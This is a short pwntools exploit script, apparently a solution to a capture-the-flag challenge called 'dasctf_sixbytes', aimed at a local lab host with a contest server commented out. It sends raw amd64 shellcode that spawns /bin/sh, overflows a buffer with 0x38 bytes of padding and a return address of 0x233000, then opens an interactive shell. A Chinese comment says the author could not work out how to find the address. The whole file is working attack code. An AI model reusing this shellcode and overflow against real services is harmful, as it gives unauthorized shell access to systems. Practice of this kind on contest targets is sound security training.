
from pwn import *

# io = remote("node4.buuoj.cn", 26938)
io = remote("192.168.170.128", 1234)
elf = ELF('./dasctf_sixbytes')

# shellcode_0 = asm(shellcraft.amd64.linux.sh())
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

bss = 0x0201020
padding = 0x38

io.recvuntil("me?")
io.sendline(shellcode)
io.recvuntil("else?")
io.sendline(b'a' * padding + p64(0x233000)) #地址不会找

io.interactive()